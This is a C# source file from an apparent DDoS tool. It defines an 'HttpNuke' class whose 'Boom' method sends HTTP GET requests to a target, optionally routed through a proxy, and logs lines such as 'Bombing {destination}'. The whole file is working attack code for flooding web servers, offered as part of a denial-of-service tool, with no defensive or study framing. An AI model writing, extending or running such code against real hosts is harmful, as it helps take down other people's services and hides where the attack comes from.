using ddos.Interfaces;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.Silo
{
    public class HttpNuke : BaseNuke
    {
        private readonly IHttpClientFactory _httpClientFactory;
        public HttpNuke(ILogger<HttpNuke> logger, IServiceProvider serviceProvider, IAppArgs appArgs, IHttpClientFactory httpClientFactory) : base(logger, serviceProvider, appArgs)
        {
            _httpClientFactory = httpClientFactory ?? throw new ArgumentNullException(nameof(httpClientFactory));
        }

        public override async Task Boom(string destination, bool useProxy, CancellationToken cancellationToken)
        {
            Logger.LogInformation($"Http(s) get...");
            Logger.LogTrace($"Bombing {destination}");
            HttpClient client = null;
            try
            {
                if (useProxy)
                {
                    var handler = ServiceProvider.GetService<ProxyHttpHandler>();
                    client = new HttpClient(handler);
                    client.Timeout = TimeSpan.FromSeconds(AppArgs.HttpTimeOut);
                }
                else
                    client = _httpClientFactory.CreateClient("HttpClient");

                var response = await client.GetAsync(destination, cancellationToken);

                var s = await response.Content.ReadAsStringAsync();
            }
            catch (Exception ex)
            {
                Logger.LogError(ex.Message, ex);
            }
            finally
            {
                if (useProxy)
                    client.Dispose();
            }

        } 

        public override string WhoAmI()
        {
            return "Http";
        }
    }
}
